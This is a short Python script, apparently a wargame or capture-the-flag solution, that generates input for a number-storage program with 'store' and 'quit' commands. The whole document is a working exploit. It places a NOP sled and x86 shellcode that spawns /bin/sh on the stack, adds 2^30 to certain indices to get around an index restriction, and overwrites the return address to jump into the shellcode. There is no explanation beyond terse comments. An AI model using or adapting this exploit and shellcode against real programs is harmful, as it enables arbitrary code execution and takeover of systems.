payload = ""

# Starting with a NOP sled
shellcode = [0x90909090] * 90

# Adding the actual shellcode
shellcode += [
    0xe1f7c931,
    0x2f2f6851,
    0x2f686873,
    0x896e6962,
    0xcd0bb0e3,
    0x00000080,
]

# Putting the shellcode into the stack
for i, dword in enumerate(shellcode):
    if (i % 3 == 0):
        print("store\n" +"{}\n".format(dword) + "{}".format(i + 1073741824))
    else:
        print("store\n" +"{}\n".format(dword) + "{}".format(i))

# Overwriting the return address
print("store\n{0}\n{1}".format(0xffffdc74 + 350, 1073741824 + 114))
print("quit")
